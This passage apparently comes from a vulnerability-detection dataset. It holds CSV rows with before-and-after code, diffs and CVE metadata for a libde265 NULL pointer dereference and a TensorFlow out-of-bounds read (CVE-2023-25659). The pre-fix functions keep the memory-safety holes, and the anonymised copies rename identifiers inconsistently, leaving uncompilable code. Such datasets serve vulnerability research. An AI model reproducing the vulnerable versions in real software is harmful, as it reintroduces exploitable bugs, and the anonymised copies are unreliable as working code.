                                              VAR_49, VAR_50, VAR_46, VAR_27);
          VAR_0->acceleration.put_weighted_pred(VAR_13[2], VAR_14[2],
                                              VAR_24[1][0], VAR_7, VAR_8 / VAR_20, VAR_9 / VAR_21,
                                              VAR_51, VAR_52, VAR_46, VAR_27);
        }
      }
      else {
        VAR_0->add_warning(VAR_43, false);
        VAR_2->integrity = VAR_17;
      }
    }
  }
  else {
    assert(VAR_1->slice_type == VAR_53);

    if (VAR_25[0]==1 && VAR_25[1]==1) {
      if (VAR_15->weighted_bipred_flag==0) {
        /* COMMENT_39 */
        /* COMMENT_40 */

        int16_t* VAR_54 = VAR_22[0];
        int16_t* VAR_55 = VAR_22[1];

        VAR_0->acceleration.put_weighted_pred_avg(VAR_13[0], VAR_14[0],
                                                VAR_54,VAR_55, VAR_7, VAR_8, VAR_9, VAR_26);

        int16_t* VAR_56 = VAR_24[0][0];
        int16_t* VAR_57 = VAR_24[0][1];
        int16_t* VAR_58 = VAR_24[1][0];
        int16_t* VAR_59 = VAR_24[1][1];

        VAR_0->acceleration.put_weighted_pred_avg(VAR_13[1], VAR_14[1],
                                                VAR_56,VAR_57, VAR_7,
                                                VAR_8/VAR_20, VAR_9/VAR_21, VAR_27);
        VAR_0->acceleration.put_weighted_pred_avg(VAR_13[2], VAR_14[2],
                                                VAR_58,VAR_59, VAR_7,
                                                VAR_8/VAR_20, VAR_9/VAR_21, VAR_27);
      }
      else {
        /* COMMENT_38 */

        int VAR_44 = VAR_10->refIdx[0];
        int VAR_60 = VAR_10->refIdx[1];

        int VAR_45   = VAR_1->luma_log2_weight_denom + VAR_38;
        int VAR_46 = VAR_1->ChromaLog2WeightDenom + VAR_40;

        int VAR_47 = VAR_1->LumaWeight[0][VAR_44];
        int VAR_48 = VAR_1->luma_offset[0][VAR_44] * (1<<(VAR_39));
        int VAR_61 = VAR_1->LumaWeight[1][VAR_60];
        int VAR_62 = VAR_1->luma_offset[1][VAR_60] * (1<<(VAR_39));

        int VAR_49 = VAR_1->ChromaWeight[0][VAR_44][0];
        int VAR_50 = VAR_1->ChromaOffset[0][VAR_44][0] * (1<<(VAR_41));
        int VAR_51 = VAR_1->ChromaWeight[0][VAR_44][1];
        int VAR_52 = VAR_1->ChromaOffset[0][VAR_44][1] * (1<<(VAR_41));
        int VAR_63 = VAR_1->ChromaWeight[1][VAR_60][0];
        int VAR_64 = VAR_1->ChromaOffset[1][VAR_60][0] * (1<<(VAR_41));
        int VAR_65 = VAR_1->ChromaWeight[1][VAR_60][1];
        int VAR_66 = VAR_1->ChromaOffset[1][VAR_60][1] * (1<<(VAR_41));

        logtrace(VAR_32,""weighted-BI-0 [%d] %d %d %d  %dx%d\n"", VAR_44, VAR_45-6,VAR_47,VAR_48,VAR_8,VAR_9);
        logtrace(VAR_32,""weighted-BI-1 [%d] %d %d %d  %dx%d\n"", VAR_60, VAR_45-6,VAR_61,VAR_62,VAR_8,VAR_9);

        int16_t* VAR_54 = VAR_22[0];
        int16_t* VAR_55 = VAR_22[1];

        VAR_0->acceleration.put_weighted_bipred(VAR_13[0], VAR_14[0],
                                              VAR_54,VAR_55, VAR_7, VAR_8, VAR_9,
                                              VAR_47,VAR_48,
                                              VAR_61,VAR_62,
                                              VAR_45, VAR_26);

        int16_t* VAR_56 = VAR_24[0][0];
        int16_t* VAR_57 = VAR_24[0][1];
        int16_t* VAR_58 = VAR_24[1][0];
        int16_t* VAR_59 = VAR_24[1][1];

        if (VAR_2->get_chroma_format() != VAR_37) {
          VAR_0->acceleration.put_weighted_bipred(VAR_13[1], VAR_14[1],
                                                VAR_56, VAR_57, VAR_7, VAR_8 / VAR_20, VAR_9 / VAR_21,
                                                VAR_49, VAR_50,
                                                VAR_63, VAR_64,
                                                VAR_46, VAR_27);
          VAR_0->acceleration.put_weighted_bipred(VAR_13[2], VAR_14[2],
                                                VAR_58, VAR_59, VAR_7, VAR_8 / VAR_20, VAR_9 / VAR_21,
                                                VAR_51, VAR_52,
                                                VAR_65, VAR_66,
                                                VAR_46, VAR_27);
        }
      }
    }
    else if (VAR_25[0]==1 || VAR_25[1]==1) {
      int VAR_28 = VAR_25[0] ? 0 : 1;

      if (VAR_15->weighted_bipred_flag==0) {
        VAR_0->acceleration.put_unweighted_pred(VAR_13[0], VAR_14[0],
                                              VAR_22[VAR_28],VAR_7, VAR_8,VAR_9, VAR_26);

        if (VAR_2->get_chroma_format() != VAR_37) {
          VAR_0->acceleration.put_unweighted_pred(VAR_13[1], VAR_14[1],
                                                VAR_24[0][VAR_28], VAR_7,
                                                VAR_8 / VAR_20, VAR_9 / VAR_21, VAR_27);
          VAR_0->acceleration.put_unweighted_pred(VAR_13[2], VAR_14[2],
                                                VAR_24[1][VAR_28], VAR_7,
                                                VAR_8 / VAR_20, VAR_9 / VAR_21, VAR_27);
        }
      }
      else {
        int VAR_67 = VAR_10->refIdx[VAR_28];

        int VAR_45   = VAR_1->luma_log2_weight_denom + VAR_38;
        int VAR_46 = VAR_1->ChromaLog2WeightDenom  + VAR_40;

        int VAR_68 = VAR_1->LumaWeight[VAR_28][VAR_67];
        int VAR_69 = VAR_1->luma_offset[VAR_28][VAR_67] * (1<<(VAR_39));

        int VAR_70 = VAR_1->ChromaWeight[VAR_28][VAR_67][0];
        int VAR_71 = VAR_1->ChromaOffset[VAR_28][VAR_67][0] * (1<<(VAR_41));
        int VAR_72 = VAR_1->ChromaWeight[VAR_28][VAR_67][1];
        int VAR_73 = VAR_1->ChromaOffset[VAR_28][VAR_67][1] * (1<<(VAR_41));

        logtrace(VAR_32,""weighted-B-L%d [%d] %d %d %d  %dx%d\n"", VAR_28, VAR_67, VAR_45-6,VAR_68,VAR_69,VAR_8,VAR_9);

        VAR_0->acceleration.put_weighted_pred(VAR_13[0], VAR_14[0],
                                            VAR_22[VAR_28],VAR_7, VAR_8,VAR_9,
                                            VAR_68, VAR_69, VAR_45, VAR_26);

        if (VAR_2->get_chroma_format() != VAR_37) {
          VAR_0->acceleration.put_weighted_pred(VAR_13[1], VAR_14[1],
                                              VAR_24[0][VAR_28], VAR_7,
                                              VAR_8 / VAR_20, VAR_9 / VAR_21,
                                              VAR_70, VAR_71, VAR_46, VAR_27);
          VAR_0->acceleration.put_weighted_pred(VAR_13[2], VAR_14[2],
                                              VAR_24[1][VAR_28], VAR_7,
                                              VAR_8 / VAR_20, VAR_9 / VAR_21,
                                              VAR_72, VAR_73, VAR_46, VAR_27);
        }
      }
    }
    else {
      /* COMMENT_41 */
      /* COMMENT_42 */

      VAR_0->add_warning(VAR_43, false);
      VAR_2->integrity = VAR_17;
    }
  }

#if defined(VAR_74) && 0
  logtrace(VAR_75,""MC pixels (luma), position %d %d:\n"", VAR_11,VAR_12);

  for (int VAR_76=0;VAR_76<VAR_9;VAR_76++) {
    logtrace(VAR_75,""MC-y-%d-%d "",VAR_11,VAR_12+VAR_76);

    for (int VAR_77=0;VAR_77<VAR_8;VAR_77++) {
      logtrace(VAR_75,""*%02x "", VAR_13[0][VAR_77+VAR_76*VAR_14[0]]);
    }

    logtrace(VAR_75,""*\n"");
  }


  logtrace(VAR_75,""MC pixels (chroma cb), position %d %d:\n"", VAR_11/2,VAR_12/2);

  for (int VAR_76=0;VAR_76<VAR_9/2;VAR_76++) {
    logtrace(VAR_75,""MC-cb-%d-%d "",VAR_11/2,VAR_12/2+VAR_76);

    for (int VAR_77=0;VAR_77<VAR_8/2;VAR_77++) {
      logtrace(VAR_75,""*%02x "", VAR_13[1][VAR_77+VAR_76*VAR_14[1]]);
    }

    logtrace(VAR_75,""*\n"");
  }


  logtrace(VAR_75,""MC pixels (chroma cr), position %d %d:\n"", VAR_11/2,VAR_12/2);

  for (int VAR_76=0;VAR_76<VAR_9/2;VAR_76++) {
    logtrace(VAR_75,""MC-cr-%d-%d "",VAR_11/2,VAR_12/2+VAR_76);

    for (int VAR_77=0;VAR_77<VAR_8/2;VAR_77++) {
      logtrace(VAR_75,""*%02x "", VAR_13[2][VAR_77+VAR_76*VAR_14[2]]);
    }

    logtrace(VAR_75,""*\n"");
  }
#endif
}",strukturag/libde265/48eb7dafe204b825b4a62948ed171a0cd3f1bda2/motion.cc/vul/after/0.json,"--- func_before
+++ func_after
@@ -232,12 +232,14 @@
         ctx->acceleration.put_weighted_pred(pixels[0], stride[0],
                                             predSamplesL[0],nCS, nPbW,nPbH,
                                             luma_w0, luma_o0, luma_log2WD, bit_depth_L);
-        ctx->acceleration.put_weighted_pred(pixels[1], stride[1],
-                                            predSamplesC[0][0],nCS, nPbW/SubWidthC,nPbH/SubHeightC,
-                                            chroma0_w0, chroma0_o0, chroma_log2WD, bit_depth_C);
-        ctx->acceleration.put_weighted_pred(pixels[2], stride[2],
-                                            predSamplesC[1][0],nCS, nPbW/SubWidthC,nPbH/SubHeightC,
-                                            chroma1_w0, chroma1_o0, chroma_log2WD, bit_depth_C);
+        if (img->get_chroma_format() != de265_chroma_mono) {
+          ctx->acceleration.put_weighted_pred(pixels[1], stride[1],
+                                              predSamplesC[0][0], nCS, nPbW / SubWidthC, nPbH / SubHeightC,
+                                              chroma0_w0, chroma0_o0, chroma_log2WD, bit_depth_C);
+          ctx->acceleration.put_weighted_pred(pixels[2], stride[2],
+                                              predSamplesC[1][0], nCS, nPbW / SubWidthC, nPbH / SubHeightC,
+                                              chroma1_w0, chroma1_o0, chroma_log2WD, bit_depth_C);
+        }
       }
       else {
         ctx->add_warning(DE265_WARNING_BOTH_PREDFLAGS_ZERO, false);
@@ -331,12 +333,15 @@
       if (pps->weighted_bipred_flag==0) {
         ctx->acceleration.put_unweighted_pred(pixels[0], stride[0],
                                               predSamplesL[l],nCS, nPbW,nPbH, bit_depth_L);
-        ctx->acceleration.put_unweighted_pred(pixels[1], stride[1],
-                                              predSamplesC[0][l],nCS,
-                                              nPbW/SubWidthC,nPbH/SubHeightC, bit_depth_C);
-        ctx->acceleration.put_unweighted_pred(pixels[2], stride[2],
-                                              predSamplesC[1][l],nCS,
-                                              nPbW/SubWidthC,nPbH/SubHeightC, bit_depth_C);
+
+        if (img->get_chroma_format() != de265_chroma_mono) {
+          ctx->acceleration.put_unweighted_pred(pixels[1], stride[1],
+                                                predSamplesC[0][l], nCS,
+                                                nPbW / SubWidthC, nPbH / SubHeightC, bit_depth_C);
+          ctx->acceleration.put_unweighted_pred(pixels[2], stride[2],
+                                                predSamplesC[1][l], nCS,
+                                                nPbW / SubWidthC, nPbH / SubHeightC, bit_depth_C);
+        }
       }
       else {
         int refIdx = vi->refIdx[l];","{'deleted_lines': ['        ctx->acceleration.put_weighted_pred(pixels[1], stride[1],', '                                            predSamplesC[0][0],nCS, nPbW/SubWidthC,nPbH/SubHeightC,', '                                            chroma0_w0, chroma0_o0, chroma_log2WD, bit_depth_C);', '        ctx->acceleration.put_weighted_pred(pixels[2], stride[2],', '                                            predSamplesC[1][0],nCS, nPbW/SubWidthC,nPbH/SubHeightC,', '                                            chroma1_w0, chroma1_o0, chroma_log2WD, bit_depth_C);', '        ctx->acceleration.put_unweighted_pred(pixels[1], stride[1],', '                                              predSamplesC[0][l],nCS,', '                                              nPbW/SubWidthC,nPbH/SubHeightC, bit_depth_C);', '        ctx->acceleration.put_unweighted_pred(pixels[2], stride[2],', '                                              predSamplesC[1][l],nCS,', '                                              nPbW/SubWidthC,nPbH/SubHeightC, bit_depth_C);'], 'added_lines': ['        if (img->get_chroma_format() != de265_chroma_mono) {', '          ctx->acceleration.put_weighted_pred(pixels[1], stride[1],', '                                              predSamplesC[0][0], nCS, nPbW / SubWidthC, nPbH / SubHeightC,', '                                              chroma0_w0, chroma0_o0, chroma_log2WD, bit_depth_C);', '          ctx->acceleration.put_weighted_pred(pixels[2], stride[2],', '                                              predSamplesC[1][0], nCS, nPbW / SubWidthC, nPbH / SubHeightC,', '                                              chroma1_w0, chroma1_o0, chroma_log2WD, bit_depth_C);', '        }', '', '        if (img->get_chroma_format() != de265_chroma_mono) {', '          ctx->acceleration.put_unweighted_pred(pixels[1], stride[1],', '                                                predSamplesC[0][l], nCS,', '                                                nPbW / SubWidthC, nPbH / SubHeightC, bit_depth_C);', '          ctx->acceleration.put_unweighted_pred(pixels[2], stride[2],', '                                                predSamplesC[1][l], nCS,', '                                                nPbW / SubWidthC, nPbH / SubHeightC, bit_depth_C);', '        }']}",True,libde265 v1.0.10 was discovered to contain a NULL pointer dereference in the ff_hevc_put_unweighted_pred_8_sse function at sse-motion.cc. This vulnerability allows attackers to cause a Denial of Service (DoS) via a crafted input file.,5.5,MEDIUM,1,valid,2023-01-29T11:18:19Z,4
CVE-2023-25659,['CWE-125'],CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H,1,tensorflow,"Add out of bounds array check to dynamic_stitch_op.

PiperOrigin-RevId: 506418249",ee004b18b976eeb5a758020af8880236cd707d05,https://github.com/tensorflow/tensorflow/commit/ee004b18b976eeb5a758020af8880236cd707d05,tensorflow/core/kernels/dynamic_stitch_op.cc,Compile,"void Compile(XlaOpKernelContext* ctx) override {
std::vector<xla::Literal> indices_input;
OP_REQUIRES_OK(ctx, ctx->ConstantInputList(""indices"", &indices_input));
std::vector<xla::XlaOp> data;
std::vector<TensorShape> data_shapes;
OP_REQUIRES_OK(ctx, ctx->InputList(""data"", &data, &data_shapes));
std::vector<xla::Literal> indices(indices_input.size());
const TensorShape& data0_shape = data_shapes[0];
TensorShape indices0_shape;
OP_REQUIRES_OK(
ctx, XLAShapeToTensorShape(indices_input[0].shape(), &indices0_shape));
for (int input_num = 0; input_num < indices_input.size(); input_num++) {
TensorShape indices_shape;
OP_REQUIRES_OK(ctx,
XLAShapeToTensorShape(indices_input[input_num].shape(),
&indices_shape));
TensorShape& data_shape = data_shapes[input_num];
if (!TensorShapeUtils::StartsWith(data_shape, indices_shape)) {
for (int64_t i = 0; i < indices_shape.dims(); ++i) {
data_shape.set_dim(i, indices_shape.dim_size(i));
data[input_num] = xla::SliceInDim(data[input_num], 0,
indices_shape.dim_size(i), 1, i);
}
}
OP_REQUIRES(
ctx, TensorShapeUtils::StartsWith(data_shape, indices_shape),
errors::InvalidArgument(""data["", input_num,
""].shape = "", data_shape.DebugString(),
"" does not start with indices["", input_num,
""].shape = "", indices_shape.DebugString()));
OP_REQUIRES(
ctx,
input_num == 0 || SameExtraShape(data0_shape, indices0_shape,
data_shape, indices_shape),
errors::InvalidArgument(
""Need data[0].shape["", indices0_shape.dims(), "":] = data["",
input_num, ""].shape["", indices_shape.dims(),
"":], got data[0].shape = "", data0_shape.DebugString(), "", data["",
input_num, ""].shape = "", data_shape.DebugString(),
"", indices[0].shape = "", indices0_shape.DebugString(),
"", indices["", input_num,
""].shape = "", indices_shape.DebugString()));
OP_REQUIRES_OK(ctx,
XlaHelpers::ReshapeLiteral(indices_input[input_num],
{indices_shape.num_elements()},
&indices[input_num]));
}
int max_index = -1;
for (int input_num = 0; input_num < indices.size(); input_num++) {
for (int i = 0; i < indices[input_num].shape().dimensions(0); ++i) {
max_index = std::max(max_index, indices[input_num].Get<int>({i}));
}
}
int number_of_indices = max_index + 1;
int64_t result_rank = 1 + data0_shape.dims() - indices0_shape.dims();
if (number_of_indices == 0) {
std::vector<int64_t> result_shape(result_rank);
for (int d = indices0_shape.dims(); d < data0_shape.dims(); d++) {
result_shape[d - indices0_shape.dims() + 1] = data0_shape.dim_size(d);
}
xla::PrimitiveType element_type =
ctx->input_xla_type(ctx->num_inputs() - 1);
xla::Literal empty_literal = xla::Literal::CreateFromShape(
xla::ShapeUtil::MakeShape(element_type, result_shape));
ctx->SetOutput(0, xla::ConstantLiteral(ctx->builder(), empty_literal));
return;
}
std::vector<int32> src_input_vector(number_of_indices);
std::vector<int32> src_slice_vector(number_of_indices);
std::vector<bool> src_index_used(number_of_indices);
int index_used_count = 0;
for (int input_num = 0; input_num < indices.size(); input_num++) {
for (int i = 0; i < indices[input_num].shape().dimensions(0); ++i) {
int index = indices[input_num].Get<int>({i});
src_input_vector[index] = input_num;
src_slice_vector[index] = i;
if (!src_index_used[index]) {
src_index_used[index] = true;
++index_used_count;
}
}
}
OP_REQUIRES(ctx, index_used_count == number_of_indices,
errors::InvalidArgument(""not all indices are used""));
std::vector<xla::XlaOp> input(indices.size());
for (int input_num = 0; input_num < indices.size(); input_num++) {
TensorShape new_shape;
new_shape.AddDim(indices[input_num].shape().dimensions(0));
for (int d = indices0_shape.dims(); d < data0_shape.dims(); d++) {
new_shape.AddDim(data0_shape.dim_size(d));
}
auto handle = data[input_num];
if (new_shape == data_shapes[input_num]) {
input[input_num] = handle;
} else {
input[input_num] = xla::Reshape(handle, new_shape.dim_sizes());
}
}
std::vector<int64_t> slice_start(result_rank);
std::vector<int64_t> slice_limit(result_rank);
std::vector<int64_t> stride(result_rank, 1);
for (int d = indices0_shape.dims(); d < data0_shape.dims(); d++) {
slice_limit[1 + d - indices0_shape.dims()] = data0_shape.dim_size(d);
}
std::vector<xla::XlaOp> to_concat(number_of_indices);
for (int index_num = 0; index_num < number_of_indices; index_num++) {
const auto& expression = input[src_input_vector[index_num]];
slice_start[0] = src_slice_vector[index_num];
slice_limit[0] = src_slice_vector[index_num] + 1;
to_concat[index_num] =
xla::Slice(expression, slice_start, slice_limit, stride);
}
ctx->SetOutput(0, xla::ConcatInDim(ctx->builder(), to_concat, 0));
}","void Compile(XlaOpKernelContext* VAR_0) override {
std::vector<xla::Literal> VAR_1;
OP_REQUIRES_OK(VAR_0, VAR_0->ConstantInputList(""indices"", &VAR_1));
std::vector<xla::XlaOp> VAR_2;
std::vector<TensorShape> VAR_3;
OP_REQUIRES_OK(VAR_0, VAR_0->InputList(""data"", &VAR_2, &VAR_3));
std::vector<xla::Literal> VAR_4(VAR_1.size());
const TensorShape& VAR_5 = VAR_3[0];
TensorShape VAR_6;
OP_REQUIRES_OK(
VAR_0, XLAShapeToTensorShape(VAR_1[0].shape(), &VAR_6));
for (int VAR_7 = 0; VAR_7 < VAR_1.size(); VAR_7++) {
TensorShape VAR_8;
OP_REQUIRES_OK(VAR_0,
XLAShapeToTensorShape(VAR_1[VAR_7].shape(),
&VAR_8));
TensorShape& VAR_9 = VAR_3[VAR_7];
if (!TensorShapeUtils::StartsWith(VAR_9, VAR_8)) {
for (int64_t VAR_10 = 0; VAR_10 < VAR_8.dims(); ++VAR_10) {
VAR_9.set_dim(VAR_10, VAR_8.dim_size(VAR_10));
VAR_2[VAR_7] = xla::SliceInDim(VAR_2[VAR_7], 0,
VAR_8.dim_size(VAR_10), 1, VAR_10);
}
}
OP_REQUIRES(
VAR_0, TensorShapeUtils::StartsWith(VAR_9, VAR_8),
errors::InvalidArgument(""data["", VAR_7,
""].shape = "", VAR_9.DebugString(),
"" does not start with indices["", VAR_7,
""].shape = "", VAR_8.DebugString()));
OP_REQUIRES(
VAR_0,
VAR_7 == 0 || SameExtraShape(VAR_5, VAR_6,
VAR_9, VAR_8),
errors::InvalidArgument(
""Need data[0].shape["", VAR_6.dims(), "":] = data["",
VAR_7, ""].shape["", VAR_8.dims(),
"":], got data[0].shape = "", VAR_5.DebugString(), "", data["",
VAR_7, ""].shape = "", VAR_9.DebugString(),
"", indices[0].shape = "", VAR_6.DebugString(),
"", indices["", VAR_7,
""].shape = "", VAR_8.DebugString()));
OP_REQUIRES_OK(VAR_0,
XlaHelpers::ReshapeLiteral(VAR_1[VAR_7],
{VAR_8.num_elements()},
&VAR_4[VAR_7]));
}
int VAR_11 = -1;
for (int VAR_7 = 0; VAR_7 < VAR_4.size(); VAR_7++) {
for (int VAR_10 = 0; VAR_10 < VAR_4[VAR_7].shape().dimensions(0); ++VAR_10) {
VAR_11 = std::max(VAR_11, VAR_4[VAR_7].Get<int>({VAR_10}));
}
}
int VAR_12 = VAR_11 + 1;
int64_t VAR_13 = 1 + VAR_5.dims() - VAR_6.dims();
if (VAR_12 == 0) {
std::vector<int64_t> result_shape(result_rank);
for (int VAR_14 = VAR_6.dims(); VAR_14 < VAR_5.dims(); VAR_14++) {
VAR_15[VAR_14 - VAR_6.dims() + 1] = VAR_5.dim_size(VAR_14);
}
xla::PrimitiveType VAR_16 =
VAR_0->input_xla_type(VAR_0->num_inputs() - 1);
xla::Literal VAR_17 = xla::Literal::CreateFromShape(
xla::ShapeUtil::MakeShape(VAR_16, VAR_15));
VAR_0->SetOutput(0, xla::ConstantLiteral(VAR_0->builder(), VAR_17));
return;
}
std::vector<int32> src_input_vector(number_of_indices);
std::vector<int32> src_slice_vector(number_of_indices);
std::vector<bool> src_index_used(number_of_indices);
int VAR_18 = 0;
for (int VAR_7 = 0; VAR_7 < VAR_4.size(); VAR_7++) {
for (int VAR_10 = 0; VAR_10 < VAR_4[VAR_7].shape().dimensions(0); ++VAR_10) {
int VAR_19 = VAR_4[VAR_7].Get<int>({VAR_10});
VAR_20[VAR_19] = VAR_7;
VAR_21[VAR_19] = VAR_10;
if (!VAR_22[VAR_19]) {
VAR_22[VAR_19] = true;
++VAR_18;
}
}
}
OP_REQUIRES(VAR_0, VAR_18 == number_of_indices,
errors::InvalidArgument(""not all indices are used""));
std::vector<xla::XlaOp> VAR_23(VAR_4.size());
for (int VAR_7 = 0; VAR_7 < VAR_4.size(); VAR_7++) {
TensorShape VAR_24;
VAR_24.AddDim(VAR_4[VAR_7].shape().dimensions(0));
for (int VAR_14 = VAR_6.dims(); VAR_14 < VAR_5.dims(); VAR_14++) {
VAR_24.AddDim(VAR_5.dim_size(VAR_14));
}
auto VAR_25 = VAR_2[VAR_7];
if (VAR_24 == VAR_3[VAR_7]) {
VAR_23[VAR_7] = VAR_25;
} else {
VAR_23[VAR_7] = xla::Reshape(VAR_25, VAR_24.dim_sizes());
}
}
std::vector<int64_t> slice_start(result_rank);
std::vector<int64_t> slice_limit(result_rank);
std::vector<int64_t> VAR_26(result_rank, 1);
for (int VAR_14 = VAR_6.dims(); VAR_14 < VAR_5.dims(); VAR_14++) {
VAR_27[1 + VAR_14 - VAR_6.dims()] = VAR_5.dim_size(VAR_14);
}
std::vector<xla::XlaOp> to_concat(number_of_indices);
for (int VAR_28 = 0; VAR_28 < number_of_indices; VAR_28++) {
const auto& VAR_29 = VAR_23[VAR_20[VAR_28]];
VAR_30[0] = VAR_21[VAR_28];
VAR_27[0] = VAR_21[VAR_28] + 1;
VAR_31[VAR_28] =
xla::Slice(VAR_29, VAR_30, VAR_27, VAR_26);
}
VAR_0->SetOutput(0, xla::ConcatInDim(VAR_0->builder(), VAR_31, 0));
}",,"void Compile(XlaOpKernelContext* ctx) override {
    // Validate that data_shape[i] = indices[i].shape() + constant
    std::vector<xla::Literal> indices_input;
    OP_REQUIRES_OK(ctx, ctx->ConstantInputList(""indices"", &indices_input));

    std::vector<xla::XlaOp> data;
    std::vector<TensorShape> data_shapes;
    OP_REQUIRES_OK(ctx, ctx->InputList(""data"", &data, &data_shapes));

    std::vector<xla::Literal> indices(indices_input.size());

    const TensorShape& data0_shape = data_shapes[0];
    TensorShape indices0_shape;
    OP_REQUIRES_OK(
        ctx, XLAShapeToTensorShape(indices_input[0].shape(), &indices0_shape));
    for (int input_num = 0; input_num < indices_input.size(); input_num++) {
      TensorShape indices_shape;
      OP_REQUIRES_OK(ctx,
                     XLAShapeToTensorShape(indices_input[input_num].shape(),
                                           &indices_shape));
      TensorShape& data_shape = data_shapes[input_num];
      if (!TensorShapeUtils::StartsWith(data_shape, indices_shape)) {
        // This happens when data shape is a dynamic shape with bound with
        // indices_shape is a concrete shape. We use slice to reconcile the
        // mismatch.
        for (int64_t i = 0; i < indices_shape.dims(); ++i) {
          data_shape.set_dim(i, indices_shape.dim_size(i));
          data[input_num] = xla::SliceInDim(data[input_num], 0,
                                            indices_shape.dim_size(i), 1, i);
        }
      }
      OP_REQUIRES(
          ctx, TensorShapeUtils::StartsWith(data_shape, indices_shape),
          errors::InvalidArgument(""data["", input_num,
                                  ""].shape = "", data_shape.DebugString(),
                                  "" does not start with indices["", input_num,
                                  ""].shape = "", indices_shape.DebugString()));
      OP_REQUIRES(
          ctx,
          input_num == 0 || SameExtraShape(data0_shape, indices0_shape,
                                           data_shape, indices_shape),
          errors::InvalidArgument(
              ""Need data[0].shape["", indices0_shape.dims(), "":] = data["",
              input_num, ""].shape["", indices_shape.dims(),
              "":], got data[0].shape = "", data0_shape.DebugString(), "", data["",
              input_num, ""].shape = "", data_shape.DebugString(),
              "", indices[0].shape = "", indices0_shape.DebugString(),
              "", indices["", input_num,
              ""].shape = "", indices_shape.DebugString()));

      OP_REQUIRES_OK(ctx,
                     XlaHelpers::ReshapeLiteral(indices_input[input_num],
                                                {indices_shape.num_elements()},
                                                &indices[input_num]));
    }

    // Find which slice will be used for each index. If the same index
    // appears in multiple inputs, the last one is used. The logic
    // here is different from that in third_party/tensorflow because
    // it is important for XLA that there be a well-formed Concat
    // operation at the end. The existing CPU/GPU code copies multiple
    // source slices to the same destination slice if there are
    // repeated indices, whereas the XLA code works out which
    // source slice will 'win' and only uses that in the Concat.
    int max_index = -1;
    for (int input_num = 0; input_num < indices.size(); input_num++) {
      for (int i = 0; i < indices[input_num].shape().dimensions(0); ++i) {
        max_index = std::max(max_index, indices[input_num].Get<int>({i}));
      }
    }
    int number_of_indices = max_index + 1;
    int64_t result_rank = 1 + data0_shape.dims() - indices0_shape.dims();
    if (number_of_indices == 0) {
      std::vector<int64_t> result_shape(result_rank);
      for (int d = indices0_shape.dims(); d < data0_shape.dims(); d++) {
        result_shape[d - indices0_shape.dims() + 1] = data0_shape.dim_size(d);
      }
      xla::PrimitiveType element_type =
          ctx->input_xla_type(ctx->num_inputs() - 1);
      xla::Literal empty_literal = xla::Literal::CreateFromShape(
          xla::ShapeUtil::MakeShape(element_type, result_shape));
      ctx->SetOutput(0, xla::ConstantLiteral(ctx->builder(), empty_literal));
      return;
    }

    // Construct the reverse mapping, for each index, of which slice of which
    // input it comes from.
    std::vector<int32> src_input_vector(number_of_indices);
    std::vector<int32> src_slice_vector(number_of_indices);
    std::vector<bool> src_index_used(number_of_indices);
    int index_used_count = 0;
    for (int input_num = 0; input_num < indices.size(); input_num++) {
      for (int i = 0; i < indices[input_num].shape().dimensions(0); ++i) {
        int index = indices[input_num].Get<int>({i});
        OP_REQUIRES(
            ctx, index >= 0,
            errors::InvalidArgument(""indices["", index, ""] is out of range""));

        src_input_vector[index] = input_num;
        src_slice_vector[index] = i;
        if (!src_index_used[index]) {
          src_index_used[index] = true;
          ++index_used_count;
        }
      }
    }
    OP_REQUIRES(ctx, index_used_count == number_of_indices,
                errors::InvalidArgument(""not all indices are used""));

    // Look up all the children expressions that represent the data
    // inputs.
    std::vector<xla::XlaOp> input(indices.size());
    for (int input_num = 0; input_num < indices.size(); input_num++) {
      TensorShape new_shape;
      // first reshaped dimension is the number of indices for this input.
      new_shape.AddDim(indices[input_num].shape().dimensions(0));
      // Then the rest are the common extra shape.
      for (int d = indices0_shape.dims(); d < data0_shape.dims(); d++) {
        new_shape.AddDim(data0_shape.dim_size(d));
      }
      // Get the data, shaped appropriately.
      auto handle = data[input_num];
      if (new_shape == data_shapes[input_num]) {
        input[input_num] = handle;
      } else {
        input[input_num] = xla::Reshape(handle, new_shape.dim_sizes());
      }
    }

    // Set up the vectors for slicing: the first dimension will vary
    // slice by slice, and the rest take the full common extra shape.
    std::vector<int64_t> slice_start(result_rank);
    std::vector<int64_t> slice_limit(result_rank);
    std::vector<int64_t> stride(result_rank, 1);
    for (int d = indices0_shape.dims(); d < data0_shape.dims(); d++) {
      slice_limit[1 + d - indices0_shape.dims()] = data0_shape.dim_size(d);
    }
    std::vector<xla::XlaOp> to_concat(number_of_indices);
    for (int index_num = 0; index_num < number_of_indices; index_num++) {
      const auto& expression = input[src_input_vector[index_num]];
      // Take the appropriate slice of data.
      slice_start[0] = src_slice_vector[index_num];
      slice_limit[0] = src_slice_vector[index_num] + 1;
      // And place it in the concat list in the place indicated by
      // the index.
      to_concat[index_num] =
          xla::Slice(expression, slice_start, slice_limit, stride);
    }

    ctx->SetOutput(0, xla::ConcatInDim(ctx->builder(), to_concat, 0));
  }","void Compile(XlaOpKernelContext* VAR_0) override {
    /* COMMENT_0 */
    std::vector<xla::Literal> VAR_1;
    OP_REQUIRES_OK(VAR_0, VAR_0->ConstantInputList(""indices"", &VAR_1));

    std::vector<xla::XlaOp> VAR_2;
    std::vector<TensorShape> VAR_3;
    OP_REQUIRES_OK(VAR_0, VAR_0->InputList(""data"", &VAR_2, &VAR_3));

    std::vector<xla::Literal> VAR_4(VAR_1.size());

    const TensorShape& VAR_5 = VAR_3[0];
    TensorShape VAR_6;
    OP_REQUIRES_OK(
        VAR_0, XLAShapeToTensorShape(VAR_1[0].shape(), &VAR_6));
    for (int VAR_7 = 0; VAR_7 < VAR_1.size(); VAR_7++) {
      TensorShape VAR_8;
      OP_REQUIRES_OK(VAR_0,
                     XLAShapeToTensorShape(VAR_1[VAR_7].shape(),
                                           &VAR_8));
      TensorShape& VAR_9 = VAR_3[VAR_7];
      if (!TensorShapeUtils::StartsWith(VAR_9, VAR_8)) {
        /* COMMENT_1 */
        /* COMMENT_2 */
        /* COMMENT_3 */
        for (int64_t VAR_10 = 0; VAR_10 < VAR_8.dims(); ++VAR_10) {
          VAR_9.set_dim(VAR_10, VAR_8.dim_size(VAR_10));
          VAR_2[VAR_7] = xla::SliceInDim(VAR_2[VAR_7], 0,
                                            VAR_8.dim_size(VAR_10), 1, VAR_10);
        }
      }
      OP_REQUIRES(
          VAR_0, TensorShapeUtils::StartsWith(VAR_9, VAR_8),
          errors::InvalidArgument(""data["", VAR_7,
                                  ""].shape = "", VAR_9.DebugString(),
                                  "" does not start with indices["", VAR_7,
                                  ""].shape = "", VAR_8.DebugString()));
      OP_REQUIRES(
          VAR_0,
